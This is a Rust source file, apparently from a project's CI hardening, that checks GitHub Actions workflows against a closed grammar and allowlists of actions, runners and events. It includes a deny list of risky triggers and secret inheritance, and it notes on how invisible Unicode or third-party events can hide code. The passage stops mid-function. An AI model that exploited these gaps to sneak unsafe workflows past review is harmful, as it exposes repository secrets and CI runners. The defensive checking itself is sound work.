//! Contrôle des workflows GitHub Actions (SEC0-29 à 31, F10), par lignes et par indentation,
//! sans dépendance YAML. **Toute ligne non reconnue est refusée** (I1) : on n'accepte que
//! `clé: valeur`, `- clé: valeur`, `- scalaire`, les commentaires et le contenu des blocs `|`/`>`.

/// Actions permises (SEC0-30), épinglées par SHA de 40 caractères.
const ALLOWED_ACTIONS: [&str; 4] = [
    "actions/checkout",
    "actions/cache",
    "swatinem/rust-cache",
    "actions/upload-artifact",
];
/// GitHub-hosted images a job may run on (#77, public repository): the ones `ci.yml` and
/// `nightly.yml` use, pinned to a version (no `-latest`, which moves under the workflow). Any other
/// `runs-on` value is refused: `self-hosted`, any custom label, a list, a `group:` mapping, an
/// expression. Adding an image is a change of this list, in a sensitive PR.
const HOSTED_RUNNERS: [&str; 2] = ["ubuntu-24.04", "windows-2025"];
/// Events a workflow may be triggered by (#77, AS-53). The repository is public: any other event
/// (`issue_comment`, `issues`, `pull_request_review*`, `discussion*`, `release`, `workflow_call`,
/// `repository_dispatch`, `merge_group`, `pull_request_target`, `workflow_run`…) runs in the
/// context of the base repository on text written by third parties, and no workflow needs one.
const ALLOWED_EVENTS: [&str; 4] = ["push", "pull_request", "schedule", "workflow_dispatch"];
/// Seul contexte sûr dans une interpolation `${{ }}`. Tout autre (`github`, `inputs`, `matrix`,
/// `env`, `steps`, `needs`, les fonctions) n'est permis que sous `env:`, sous `with:` et dans
/// `if:` ; un `run:` le reçoit par `env:` et une variable citée (SEC0-31).
const SAFE_CONTEXTS: [&str; 1] = ["runner."];
/// Clés dont les valeurs descendantes peuvent porter une interpolation non sûre.
const DATA_KEYS: [&str; 2] = ["env", "with"];
/// Premiers caractères d'un scalaire de liste refusés : clé explicite, flux, ancre, alias,
/// balise, bloc, directive, réservés.
const ODD_SCALAR_START: &str = "?:{[&*!|>%@`";

/// Vrai si une ligne contient une interpolation hors des contextes sûrs.
fn unsafe_interpolation(line: &str) -> bool {
    line.split("${{").skip(1).any(|expr| {
        let expr: String = expr
            .split("}}")
            .next()
            .unwrap_or_default()
            .split_whitespace()
            .collect();
        let expr = expr.to_ascii_lowercase();
        let plain = expr
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"_.-".contains(&b));
        !(plain && SAFE_CONTEXTS.iter().any(|c| expr.starts_with(c)))
    })
}

fn indent(line: &str) -> usize {
    line.len() - line.trim_start_matches(' ').len()
}

/// Ligne structurée reconnue.
struct Line<'a> {
    /// Élément de liste (`- …`), dont le tiret est à la colonne `dash`.
    item: bool,
    dash: usize,
    /// Colonne de la clé (ou du scalaire, après le tiret).
    col: usize,
    /// Clé en minuscules (m4) ; `None` pour un scalaire de liste.
    key: Option<String>,
    value: &'a str,
}

/// `clé: valeur`, `- clé: valeur` ou `- scalaire` ; `None` pour toute autre forme.
fn parse(line: &str) -> Option<Line<'_>> {
    let dash = indent(line);
    let mut col = dash;
    let mut rest = &line[dash..];
    let item = rest == "-" || rest.starts_with("- ");
    if item {
        let r = rest[1..].trim_start_matches(' ');
        col += rest.len() - r.len();
        rest = r;
    }
    let pair = rest
        .split_once(':')
        .filter(|(_, v)| v.is_empty() || v.starts_with(' '));
    match pair {
        Some((key, value)) => {
            // Closed grammar (#77, AS-54): a bare name of `[A-Za-z0-9_-]`, with at most one `.`.
            // A quoted key is not a form of this check (an unclosed quote would hide the lines
            // that follow).
            let valid = !key.is_empty()
                && key.matches('.').count() <= 1
                && key
                    .chars()
                    .all(|c| c.is_ascii_alphanumeric() || "_-.".contains(c));
            let key = Some(key.to_ascii_lowercase());
            let value = value.trim_matches(' ');
            valid.then_some(Line {
                item,
                dash,
                col,
                key,
                value,
            })
        }
        None if item && !rest.is_empty() && !rest.starts_with(|c| ODD_SCALAR_START.contains(c)) => {
            let value = rest.trim_matches(' ');
            Some(Line {
                item,
                dash,
                col,
                key: None,
                value,
            })
        }
        None => None,
    }
}

fn strip_comment(value: &str) -> &str {
    value
        .find(" #")
        .map_or(value, |i| &value[..i])
        .trim_matches(' ')
}

/// A value of the closed grammar (#77, AS-54): one node on one line, with the text that is the
/// value itself (comment left out).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Value<'a> {
    /// Nothing, or only a comment: the children follow, if any.
    Empty,
    /// A block scalar header: `|`, `|-`, `>` or `>-`.
    Block(&'a str),
    /// A plain scalar, a quoted scalar closed on the line, or a flow collection closed on it.
    Scalar(&'a str),
}

/// Byte index of the quote that closes the quoted scalar starting `v` (`''` is an escaped quote
/// inside single quotes; a double-quoted scalar has no escapes, a backslash being refused).
fn quoted_end(v: &str) -> Option<usize> {
    let bytes = v.as_bytes();
    let quote = *bytes.first()?;
    let mut i = 1;
    while i < bytes.len() {
        if bytes[i] == quote {
            if quote == b'\'' && bytes.get(i + 1) == Some(&b'\'') {
                i += 2;
                continue;
            }
            return Some(i);
        }
        i += 1;
    }
    None
}

/// Byte index of the bracket that closes the flow collection starting `v`, brackets matched and
/// quoted scalars skipped; `None` when it does not close on this line.
fn flow_end(v: &str) -> Option<usize> {
    let mut open = Vec::new();
    let mut i = 0;
    while i < v.len() {
        let c = v.as_bytes()[i];
        match c {
            b'"' | b'\'' => i += quoted_end(&v[i..])?,
            b'[' => open.push(b']'),
            b'{' => open.push(b'}'),
            b']' | b'}' => {
                if open.pop() != Some(c) {
                    return None;
                }
                if open.is_empty() {
                    return Some(i);
                }
            }
            _ => {}
        }
        i += 1;
    }
    None
}

/// What may follow a value on its line: nothing, or a comment after a space.
fn only_comment(rest: &str) -> bool {
    rest.is_empty() || (rest.starts_with(' ') && rest.trim_start_matches(' ').starts_with('#'))
}

/// Reads the value of a `key: value` or `- value` line against the closed grammar, or says why
/// it is outside it. The value is trimmed, as [`parse`] gives it.
fn read_value(v: &str) -> Result<Value<'_>, &'static str> {
    let Some(first) = v.chars().next().filter(|_| !v.starts_with('#')) else {
        return Ok(Value::Empty);
    };
    let closed = |end: Option<usize>, what: &'static str| match end {
        Some(end) if only_comment(&v[end + 1..]) => Ok(Value::Scalar(&v[..=end])),
        Some(_) => Err("text after a closed quoted scalar or flow collection"),
        None => Err(what),
    };
    match first {
        '"' | '\'' => closed(quoted_end(v), "quoted scalar not closed on its line"),
        '[' | '{' => closed(flow_end(v), "flow collection not closed on its line"),
        '|' | '>' => {
            let header = v.get(..2).filter(|h| h.ends_with('-')).unwrap_or(&v[..1]);
            if only_comment(&v[header.len()..]) {
                Ok(Value::Block(header))
            } else {
                Err("block scalar indicator other than |, |-, > and >-")
            }
        }
        '&' | '*' | '!' | '%' | '@' | '`' => Err("YAML indicator that starts no plain scalar"),
        '-' | '?' | ':' if v.len() == 1 || v[1..].starts_with(' ') => {
            Err("explicit key, nested sequence or mapping indicator in a value")
        }
        _ => {
            let code = strip_comment(v);
            if code.contains(": ") || code.ends_with(':') {
                Err("': ' in a plain scalar (mapping or continuation the check cannot read)")
            } else {
                Ok(Value::Scalar(code))
            }
        }
    }
}

/// The text of a scalar written bare, `"…"` or `'…'` with no quote inside; `None` for anything
/// else (unbalanced or nested quotes, which the check cannot read as YAML does).
fn literal_scalar(value: &str) -> Option<&str> {
    let inner = match value.as_bytes() {
        [q @ (b'"' | b'\''), .., last] if q == last => &value[1..value.len() - 1],
        _ => value,
    };
    (!inner.contains(['"', '\''])).then_some(inner)
}

/// Why a `runs-on:` value is refused, `None` when it is exactly one of [`HOSTED_RUNNERS`] (#77).
fn runner_refusal(value: &str) -> Option<String> {
    let value = strip_comment(value);
    let allowed = literal_scalar(value).is_some_and(|v| HOSTED_RUNNERS.contains(&v));
    (!allowed).then(|| {
        format!(
            "runs-on {value:?} is not one of the GitHub-hosted images {HOSTED_RUNNERS:?} \
             (self-hosted runners, labels, lists, groups and expressions are refused, #77)"
        )
    })
}

/// Event names written after `on:` on the same line: one scalar, or a flow list `[a, b]`. An empty
/// list or item is returned as an empty name, which [`event_refusal`] refuses.
fn inline_events(value: &str) -> Vec<&str> {
    let value = strip_comment(value);
    match value.strip_prefix('[').and_then(|v| v.strip_suffix(']')) {
        Some(list) => list.split(',').map(str::trim).collect(),
        None => vec![value],
    }
}

/// Why an event name written after `on:` is refused, `None` when it is one of
/// [`ALLOWED_EVENTS`]. Anything that is not a plain name (expression, anchor, block, mapping) is
/// not in the list either: the check refuses what it cannot read.
fn event_refusal(name: &str) -> Option<String> {
    let allowed = literal_scalar(name)
        .map(str::to_ascii_lowercase)
        .is_some_and(|n| ALLOWED_EVENTS.contains(&n.as_str()));
    (!allowed).then(|| {
        format!(
            "event {name:?} is not one of the allowed triggers {ALLOWED_EVENTS:?} \
             (public repository: other events run in the base repository's context, #77)"
        )
    })
}

/// Niveau ouvert de la pile d'indentation : clé, ou élément de liste (`key` = `-`).
struct Level {
    col: usize,
    key: String,
    /// La clé attend des enfants (valeur vide).
    open: bool,
    /// Colonne de ses enfants, fixée par le premier.
    child: Option<usize>,
}

/// Place la ligne dans la pile ; `false` si son indentation est incohérente.
fn place(stack: &mut Vec<Level>, l: &Line) -> bool {
    let fits = |parent: &mut Level, col: usize| {
        let ok = parent.open && parent.child.is_none_or(|c| c == col);
        parent.child = Some(col);
        ok
    };
    if l.item {
        while stack
            .last()
            .is_some_and(|t| t.col > l.dash || (t.col == l.dash && t.key == "-"))
        {
            stack.pop();
        }
        let Some(parent) = stack.last_mut() else {
            return false;
        };
        let ok = parent.col <= l.dash && fits(parent, l.dash);
        let open = l.key.is_some();
        stack.push(Level {
            col: l.dash,
            key: "-".into(),
            open,
            // A scalar item has no child: a deeper line is a continuation, which is refused.
            child: l.key.is_some().then_some(l.col),
        });
        ok
    } else {
        while stack.last().is_some_and(|t| t.col > l.col) {
            stack.pop();
        }
        if stack.last().is_some_and(|t| t.col == l.col && t.key != "-") {
            stack.pop();
        }
        match stack.last_mut() {
            None => l.col == 0,
            Some(p) if p.key == "-" => p.child == Some(l.col),
            Some(p) => p.col < l.col && fits(p, l.col),
        }
    }
}

/// Lignes de l'élément de liste (étape) qui contient la ligne `i`, de clé à l'indentation `col`.
fn step_block<'b, 'a>(lines: &'b [&'a str], i: usize, col: usize) -> &'b [&'a str] {
    let blank = |l: &str| l.trim_matches(' ').is_empty();
    let mut start = i;
    while !lines[start].trim_start_matches(' ').starts_with('-') && start > 0 {
        let prev = lines[start - 1];
        if !blank(prev) && indent(prev) < col && !prev.trim_start_matches(' ').starts_with('-') {
            break;
        }
        start -= 1;
    }
    let mut end = i + 1;
    while end < lines.len() && (blank(lines[end]) || indent(lines[end]) >= col) {
        end += 1;
    }
    &lines[start..end]
}

/// `uses:` d'une étape : action de la liste, épinglée ; `persist-credentials: false` sous le
/// `with:` d'un `actions/checkout`.
fn check_uses(lines: &[&str], i: usize, l: &Line, errors: &mut Vec<String>) {
    let n = i + 1;
    let v = strip_comment(l.value).trim_matches(['"', '\'']);
    let (repo, sha) = v.split_once('@').unwrap_or((v, ""));
    let owner_repo = repo.splitn(3, '/').take(2).collect::<Vec<_>>().join("/");
    let owner_repo = owner_repo.to_ascii_lowercase();
    let pinned = sha.len() == 40 && sha.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'));
    if !ALLOWED_ACTIONS.contains(&owner_repo.as_str()) || !pinned {
        errors.push(format!(
            "ligne {n} : action hors liste ou non épinglée par SHA (SEC0-30)"
        ));
    }
    let mut under_with = false;
    let persist = step_block(lines, i, l.col).iter().any(|s| {
        let Some(s) = parse(s) else { return false };
        let key = s.key.as_deref().unwrap_or_default();
        if s.col == l.col {
            under_with = key == "with";
        }
        s.col > l.col
            && under_with
            && key == "persist-credentials"
            && strip_comment(s.value) == "false"
    });
    if owner_repo == "actions/checkout" && !persist {
        errors.push(format!(
            "ligne {n} : actions/checkout sans persist-credentials: false sous with:"
        ));
    }
}

/// Action épinglée d'une ligne `uses:` : dépôt `propriétaire/nom`, SHA et étiquette du commentaire.
#[derive(Debug, PartialEq, Eq)]
pub struct Pin {
    pub line: usize,
    pub repo: String,
    pub sha: String,
    pub tag: Option<String>,
}

/// Lignes `uses:` d'un workflow déjà accepté par [`check_workflow`] (T3-b, J8). L'étiquette est
/// le premier mot du commentaire (`# v7.0.1`), en caractères sûrs pour une adresse de l'API.
pub fn pinned_uses(text: &str) -> Vec<Pin> {
    let safe = |s: &str| {
        !s.is_empty()
            && !s.starts_with(['.', '-'])
            && !s.contains("..")
            && s.bytes()
                .all(|b| b.is_ascii_alphanumeric() || b"._-".contains(&b))
    };
    let mut out = Vec::new();
    for (i, raw) in text.lines().enumerate() {
        let Some(l) = parse(raw).filter(|l| l.key.as_deref() == Some("uses")) else {
            continue;
        };
        let v = strip_comment(l.value).trim_matches(['"', '\'']);
        let (path, sha) = v.split_once('@').unwrap_or((v, ""));
        let repo = path.splitn(3, '/').take(2).collect::<Vec<_>>().join("/");
        let tag = l
            .value
            .find(" #")
            .and_then(|c| l.value[c + 2..].split(' ').find(|w| !w.is_empty()));
        out.push(Pin {
            line: i + 1,
            repo,
            sha: sha.to_owned(),
            tag: tag.filter(|t| safe(t)).map(str::to_owned),
        });
    }
    out
}

/// Characters that YAML does not read as this check does (#77). YAML knows two white spaces,
/// the space and the tab, and breaks lines on LF, CR and, for YAML 1.1, NEL, LS and PS; `lines()`
/// and `trim()` know more or fewer of them. Text hidden behind such a character was read as a
/// comment, an empty line or a longer line here, and as YAML there (a lone CR, or a no-break
/// space before `#`, which makes the line a continuation of the previous `run:`).
///
/// The invisible format characters are refused as well, though they do not mislead YAML: the
/// bidirectional controls (U+202A..U+202E, U+2066..U+2069, "Trojan Source"), the zero-width and
/// invisible operators, the soft hyphen, the interlinear annotations and the tag characters
/// make the text a reviewer reads differ from the text that runs.
fn unreadable_char(c: char) -> bool {
    c.is_whitespace()
        || c.is_control()
        || matches!(
            c,
            '\u{AD}'
                | '\u{61C}'
                | '\u{180E}'
                | '\u{200B}'..='\u{200F}'
                | '\u{202A}'..='\u{202E}'
                | '\u{2060}'..='\u{2064}'
                | '\u{2066}'..='\u{206F}'
                | '\u{FEFF}'
                | '\u{FFF9}'..='\u{FFFB}'
                | '\u{E0000}'..='\u{E007F}'
        )
}

/// One report per line that holds a character other than the ASCII space, the LF and the CR of
/// a CRLF which is white space, a control or an invisible format character: tab, VT, FF, NEL,
/// NBSP, U+2000..U+200A, LS, PS, U+3000, zero-width characters, any BOM. Accented letters and
/// other printable text stay accepted. This is the one place that decides it, on the raw text,
/// before it is split into lines.
fn unreadable_chars(text: &str) -> Vec<String> {
    let mut found = Vec::new();
    let mut line = 1;
    let mut last = 0;
    let mut chars = text.chars().peekable();
    while let Some(c) = chars.next() {
        let crlf = c == '\r' && chars.peek() == Some(&'\n');
        if c != ' ' && c != '\n' && !crlf && unreadable_char(c) && last != line {
            last = line;
            found.push(format!(
                "ligne {line} : character U+{:04X} refused: only the space, LF and CRLF are \
                 accepted as white space, YAML would not read the line as this check does (#77)",
                u32::from(c)
            ));
        }
        line += usize::from(c == '\n');
    }
    found
}

/// Écarts d'un workflow, chacun avec son numéro de ligne.
pub fn check_workflow(text: &str) -> Vec<String> {
    let lines: Vec<&str> = text.lines().collect();
    let mut errors = unreadable_chars(text);
    let mut top_permissions = false;
    let mut stack: Vec<Level> = Vec::new();
    // Bloc `|` ou `>` ouvert : (colonne de sa clé, interpolations non sûres permises).
    let mut block: Option<(usize, bool)> = None;
    // Jobs under the top-level `jobs:`, each with the line of its `runs-on:` (#77).
    let mut jobs: Vec<(String, usize, Option<usize>)> = Vec::new();
    // Number of top-level `on:` keys: exactly one is expected (#77).
    let mut on_keys = 0;
    let mut event_count = 0;
    for (i, &raw) in lines.iter().enumerate() {
        let n = i + 1;
        let compact: String = raw.chars().filter(|c| *c != ' ').collect();
        let compact = compact.to_ascii_lowercase();
        for bad in [
            "pull_request_target",
            "workflow_run",
            "secrets:inherit",
            "<<:",
        ] {
            if compact.contains(bad) {
                errors.push(format!("ligne {n} : {bad} interdit"));
            }
        }
        if let Some((col, data)) = block {
            if raw.trim_matches(' ').is_empty() || indent(raw) > col {
                if unsafe_interpolation(raw) && !data {
                    errors.push(format!(
                        "ligne {n} : interpolation non sûre hors de env:, with: et if: (SEC0-31)"
                    ));
                }
                continue; // contenu d'un bloc : seules les interpolations y comptent
            }
            block = None;
        }
        let trimmed = raw.trim_matches(' ');
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        // Hors d'un bloc, YAML décode les échappements : `"u\x73es"` vaut `"uses"`.
        if raw.contains('\\') {
            errors.push(format!(
                "ligne {n} : barre oblique inverse hors d'un bloc | ou >"
            ));
        }
        let Some(l) = parse(raw) else {
            errors.push(format!(
                "ligne {n} : forme non reconnue (clé explicite, flux, ancre, balise…)"
            ));
            continue;
        };
        if !place(&mut stack, &l) {
            errors.push(format!("ligne {n} : indentation incohérente"));
        }
        let key = l.key.as_deref().unwrap_or_default();
        // Closed grammar (#77, AS-54): one node per line, whose value is read on that line.
        let value = match read_value(l.value) {
            Ok(value) => value,
            Err(why) => {
                errors.push(format!("ligne {n} : {why} (closed grammar, #77)"));
                continue;
            }
        };
        let v = match value {
            Value::Empty => "",
            Value::Block(text) | Value::Scalar(text) => text,
        };
        if l.key.is_none() && matches!(value, Value::Block(_)) {
            errors.push(format!(
                "ligne {n} : block scalar as a list item: its indentation is not one this check reads (#77)"
            ));
        }
        // Events: `on: x`, `on: [x, y]`, `- x` items and `x:` keys directly under `on:`.
        let events: Vec<&str> = if stack.is_empty() && !l.item && l.col == 0 && key == "on" {
            on_keys += 1;
            if v.is_empty() {
                Vec::new()
            } else {
                inline_events(v)
            }
        } else if !stack.first().is_some_and(|t| t.key == "on" && t.col == 0) {
            Vec::new()
        } else if !l.item && stack.len() == 1 {
            vec![key]
        } else if l.item && stack.len() == 2 {
            // A scalar item is an event; `- x: y` is not a form of `on:` this check reads.
            vec![if l.key.is_none() { v } else { "" }]
        } else {
            Vec::new()
        };
        event_count += events.len();
        for event in events {
            errors.extend(event_refusal(event).map(|e| format!("ligne {n} : {e}")));
        }
        if key == "runs-on" {
            errors.extend(runner_refusal(v).map(|e| format!("ligne {n} : {e}")));
        }
        if !l.item && stack.first().is_some_and(|t| t.key == "jobs" && t.col == 0) {
            match (stack.len(), jobs.last_mut()) {
                (1, _) => jobs.push((key.to_owned(), n, None)),
                (2, Some((_, _, runner))) if key == "runs-on" => {
                    if let Some(first) = runner.replace(n) {
                        errors.push(format!(
                            "ligne {n} : runs-on defined twice (first on line {first})"
                        ));
                    }
                }
                _ => {}
            }
        }
        // Les ancêtres sont en pile ; la ligne elle-même n'y est que si c'est une clé d'élément.
        let data = key == "if"
            || stack
                .iter()
                .any(|lv| DATA_KEYS.contains(&lv.key.as_str()) && lv.col < l.col);
        let data = data && key != "run";
        if unsafe_interpolation(raw) && !data {
            errors.push(format!(
                "ligne {n} : interpolation non sûre hors de env:, with: et if: (SEC0-31)"
            ));
        }
        let hidden = ["uses", "run"].iter().any(|k| {
            ["", "\"", "'"]
                .iter()
                .any(|q| compact.contains(&format!("{k}{q}:")))
        });
        if hidden && key != "uses" && key != "run" {
            errors.push(format!("ligne {n} : forme de uses: ou run: non reconnue"));
        }
        if v.starts_with(['&', '*', '!']) {
            errors.push(format!("ligne {n} : ancre, alias ou balise YAML refusé"));
        }
        // Collection en ligne : seules `{}`, `[]` et une liste de mots (`[push, pull_request]`).
        if v.starts_with(['{', '[']) && v != "{}" && v != "[]" && v[1..].contains([':', '{', '[']) {
            errors.push(format!("ligne {n} : collection en ligne refusée"));
        }
        if v.starts_with(['|', '>']) {
            block = Some((l.col, data));
        }
        if l.key.is_some() {
            let open = v.is_empty();
            stack.push(Level {
                col: l.col,
                key: key.to_owned(),
                open,
                child: None,
            });
        }
        if key == "permissions" && !l.item && l.col == 0 {
            top_permissions = v == "{}";
        }
        if key == "uses" {
            check_uses(&lines, i, &l, &mut errors);
        }
    }
    if !top_permissions {
        errors.push("permissions: {} absent au niveau du workflow (SEC0-29)".to_owned());
    }
    if on_keys != 1 || event_count == 0 {
        errors.push(format!(
            "exactly one top-level `on:` with at least one readable event expected, found \
             {on_keys} `on:` and {event_count} event(s) (#77)"
        ));
    }
    // A job without a readable `runs-on:` is refused rather than assumed to be hosted (#77).
    errors.extend(
        jobs.iter()
            .filter(|(_, _, runner)| runner.is_none())
            .map(|(job, n, _)| {
                format!("ligne {n} : job `{job}` without a `runs-on:` key of its own (#77)")
            }),
    );
    errors
}

/// Pinned installer of the CI tools; its keys live in [`TOOLS_LOCK`] (SEC0-06, G6).
pub const INSTALL_SCRIPT: &str = "tools/ci/install-tools.sh";
pub const TOOLS_LOCK: &str = "tools/dev/tools.lock";
const SCRIPT_NAME: &str = "install-tools.sh";

/// Body of the installer's `lock_value` (lines trimmed, comments left out), which
/// [`sh_lock_value`] mirrors. The check compares it instead of assuming it (fail closed).
const LOCK_VALUE_BODY: [&str; 4] = [
    "local v",
    r#"v=$(sed -n "s/^$1 *= *\"\(.*\)\".*/\1/p" "$lock" | head -n 1)"#,
    r#"[ -n "$v" ] || fail "$1 absent ou vide dans tools/dev/tools.lock.""#,
    r#"printf '%s' "$v""#,
];
/// Body of the dispatcher's `version)` entry, for which `version <tool>` reads `<tool>.version`:
/// compared to the script as well, since its key is not a literal.
const VERSION_ENTRY: [&str; 2] = [
    r#"v=$(lock_value "$(printf '%s' "${2:?outil manquant}" | sed 's/\./\\./g')\.version")"#,
    r#"printf 'version=%s\n' "$v" >> "${GITHUB_OUTPUT:-/dev/stdout}" ;;"#,
];
/// Dispatcher heads that switch on the first argument.
const DISPATCH_HEADS: [&str; 4] = [
    "case ${1:-} in",
    "case \"${1:-}\" in",
    "case $1 in",
    "case \"$1\" in",
];

/// Value of `key` in `tools.lock`, read exactly as `lock_value` of [`INSTALL_SCRIPT`] reads it:
/// first line matching `^<key> *= *"(.*)".*` (greedy, up to the last quote), `None` when absent
/// or empty. A looser reader would accept a line the script then refuses at run time (#75).
fn sh_lock_value<'a>(lock: &'a str, key: &str) -> Option<&'a str> {
    lock.lines()
        .find_map(|line| {
            let rest = line.strip_prefix(key)?.trim_start_matches(' ');
            let rest = rest.strip_prefix('=')?.trim_start_matches(' ');
            let rest = rest.strip_prefix('"')?;
            Some(&rest[..rest.rfind('"')?])
        })
        .filter(|v| !v.is_empty())
}

/// A function or subcommand name. The same characters make a word in [`Function::read`], so
/// that a call of `a-b` is followed like a call of `a_b`.
fn ident(s: &str) -> bool {
    !s.is_empty()
        && s.bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"_-".contains(&b))
}

/// A function of the installer: `name() {` at column 0 up to the first line `}`, or
/// `name() { …; }` on one line.
struct Function<'a> {
    name: &'a str,
    /// Its body lines, trimmed, comments left out.
    body: Vec<&'a str>,
    /// Keys of its `lock_value '<key>'` calls, `\.` unescaped.
    keys: Vec<String>,
    /// Words of its body, to find the other functions it calls.
    words: Vec<&'a str>,
    /// A `lock_value` call whose key is not a readable literal (see [`lock_key`]).
    opaque: bool,
}

impl<'a> Function<'a> {
    fn new(name: &'a str) -> Self {
        Function {
            name,
            body: Vec::new(),
            keys: Vec::new(),
            words: Vec::new(),
            opaque: false,
        }
    }

    fn read(&mut self, line: &'a str) {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') {
            return;
        }
        self.body.push(line);
        for call in line.split("lock_value").skip(1) {
            match lock_key(call) {
                Some(key) => self.keys.push(key),
                None => self.opaque = true,
            }
        }
        self.words.extend(
            line.split(|c: char| !(c.is_ascii_alphanumeric() || "_-".contains(c)))
                .filter(|w| !w.is_empty()),
        );
    }
}

/// Key of a `lock_value` call, from the text that follows the name: a single-quoted literal of
/// [`ident`] segments joined by `\.`, ending the word. Anything else (a variable, an unescaped
/// `.`, a concatenation such as `'a\.b'"$X"`) is `None`: the check cannot read it.
fn lock_key(call: &str) -> Option<String> {
    let (key, rest) = call.strip_prefix(" '")?.split_once('\'')?;
    let ends = rest
        .chars()
        .next()
        .is_none_or(|c| c.is_whitespace() || ");|&".contains(c));
    let segments: Vec<&str> = key.split("\\.").collect();
    (ends && segments.iter().all(|s| ident(s))).then(|| segments.join("."))
}

/// A function definition at the top level of the script.
enum Definition<'a> {
    /// `name() {`, possibly followed by a comment.
    Open(&'a str),
    /// `name() { …; }`, with its body.
    OneLine(&'a str, &'a str),
    /// Any other form (`function name`, `name () {`, an indented or non-[`ident`] name…).
    Other,
}

fn definition(line: &str) -> Option<Definition<'_>> {
    let t = line.trim_start();
    if t.split_whitespace().next() == Some("function") {
        return Some(Definition::Other);
    }
    let (name, rest) = t.split_at(t.find(['(', ' ', '\t'])?);
    if !rest.trim_start().starts_with("()") {
        return None;
    }
    if t.len() != line.len() || !ident(name) {
        return Some(Definition::Other);
    }
    let Some(body) = rest.strip_prefix("() {") else {
        return Some(Definition::Other);
    };
    if body.is_empty() || body.starts_with(" #") {
        return Some(Definition::Open(name));
    }
    match body.trim_end().strip_suffix('}') {
        Some(inner) if body.starts_with(' ') => Some(Definition::OneLine(name, inner)),
        _ => Some(Definition::Other),
    }
}

/// The functions, or why the script cannot be read (first offending line): a definition in
/// another form, a name defined twice (the shell keeps the last one), an unclosed function, or a
/// `lock_value` call outside a function and outside the dispatcher.
fn installer_functions(script: &str) -> (Vec<Function<'_>>, Option<String>) {
    let mut out: Vec<Function> = Vec::new();
    let mut refused = None;
    let mut dispatcher = false;
    let mut current: Option<Function> = None;
    for (i, line) in script.lines().enumerate() {
        if let Some(f) = current.as_mut() {
            if line == "}" {
                out.extend(current.take());
            } else {
                f.read(line);
            }
            continue;
        }
        if line.trim_start().starts_with('#') {
            continue;
        }
        dispatcher = (dispatcher || line.starts_with("case ")) && line != "esac";
        let defined = out.len();
        let why = match definition(line) {
            Some(Definition::Open(name)) => {
                current = Some(Function::new(name));
                None
            }
            Some(Definition::OneLine(name, body)) => {
                let mut f = Function::new(name);
                f.read(body);
                out.push(f);
                None
            }
            Some(Definition::Other) => {
                Some("defines a function in another form than `name() {` at column 0".to_owned())
            }
            None if line.contains("lock_value") && !dispatcher => {
                Some("calls lock_value outside a function".to_owned())
            }
            None => None,
        };
        let name = current.as_ref().or(out.get(defined)).map(|f| f.name);
        let twice = name.filter(|n| out[..defined].iter().any(|f| f.name == *n));
        let why = why.or(twice.map(|n| format!("defines {n} twice")));
        if let Some(why) = why {
            refused.get_or_insert(format!("line {} of the script {why}", i + 1));
        }
    }
    if let Some(f) = current {
        refused.get_or_insert(format!("function {} is not closed by a line `}}`", f.name));
    }
    (out, refused)
}

/// Keys read by `name` and by the functions it calls, transitively; `Err` when one of them is
/// missing or reads a key that is not a literal (fail closed: the check cannot vouch for it).
fn function_keys(functions: &[Function], name: &str) -> Result<Vec<String>, String> {
    let mut seen = vec![name];
    let mut keys = Vec::new();
    let mut i = 0;
    while let Some(&current) = seen.get(i) {
        i += 1;
        let f = functions
            .iter()
            .find(|f| f.name == current)
            .ok_or_else(|| format!("function {current} not found in the form `name() {{`"))?;
        if f.opaque {
            return Err(format!(
                "{current} calls lock_value with a key that is not a single-quoted literal"
            ));
        }
        keys.extend(f.keys.iter().cloned());
        for g in functions {
            if f.words.contains(&g.name) && !seen.contains(&g.name) {
                seen.push(g.name);
            }
        }
    }
    Ok(keys)
}

/// What a subcommand of the installer reads in `tools.lock`.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Reads {
    /// These keys, read by its function and the functions it calls.
    Keys(Vec<String>),
    /// `version <tool>`: the key `<tool>.version`.
    ToolVersion,
}

/// What each subcommand of the installer's dispatcher (the `case` at column 0, up to `esac`)
/// reads. An entry `a|b) function ;;` maps each of its names to the keys read by its function;
/// the `version)` entry must be [`VERSION_ENTRY`]. Any other entry, an entry after a glob
/// pattern (it may never run), a `lock_value` other than [`LOCK_VALUE_BODY`] or a script that
/// [`installer_functions`] cannot read gives an `Err`, reported when a workflow calls it.
fn installer_keys(script: &str) -> Vec<(String, Result<Reads, String>)> {
    let (functions, refused) = installer_functions(script);
    let reader = functions.iter().find(|f| f.name == "lock_value");
    let refused = refused.or_else(|| {
        (!reader.is_some_and(|f| f.body == LOCK_VALUE_BODY))
            .then(|| "lock_value differs from the reader this check mirrors".to_owned())
    });
    let mut lines = script.lines();
    let head = lines.by_ref().find(|l| l.starts_with("case "));
    let refused = refused.or_else(|| {
        head.filter(|h| !DISPATCH_HEADS.contains(h))
            .map(|h| format!("the dispatcher `{h}` does not switch on the first argument"))
    });
    let body: Vec<&str> = lines
        .take_while(|l| *l != "esac")
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with('#'))
        .collect();
    let pattern = |p: &str| {
        !p.is_empty()
            && p.bytes()
                .all(|b| b.is_ascii_alphanumeric() || b"_-|*?".contains(&b))
    };
    let mut out = Vec::new();
    let mut shadowed = None;
    let mut i = 0;
    while i < body.len() {
        let Some((names, first)) = body[i].split_once(')').filter(|(p, _)| pattern(p)) else {
            i += 1;
            continue;
        };
        let mut entry = vec![first.trim()];
        while !entry.last().is_some_and(|l| l.ends_with(";;")) && i + 1 < body.len() {
            i += 1;
            entry.push(body[i]);
        }
        i += 1;
        let reads = match (&refused, &shadowed, entry.as_slice()) {
            (Some(e), _, _) => Err(e.clone()),
            (None, Some(glob), _) => Err(format!("its entry follows the glob pattern `{glob})`")),
            (None, None, [one]) => match one.strip_suffix(";;").map(str::trim) {
                Some(f) if ident(f) => function_keys(&functions, f).map(Reads::Keys),
                _ => Err(format!(
                    "dispatcher entry `{names})` is not `name) function ;;`"
                )),
            },
            (None, None, ["", rest @ ..]) if names == "version" && *rest == VERSION_ENTRY[..] => {
                Ok(Reads::ToolVersion)
            }
            (None, None, _) => Err(format!(
                "dispatcher entry `{names})` is neither `name) function ;;` nor the known `version)` entry"
            )),
        };
        for name in names.split('|') {
            if ident(name) {
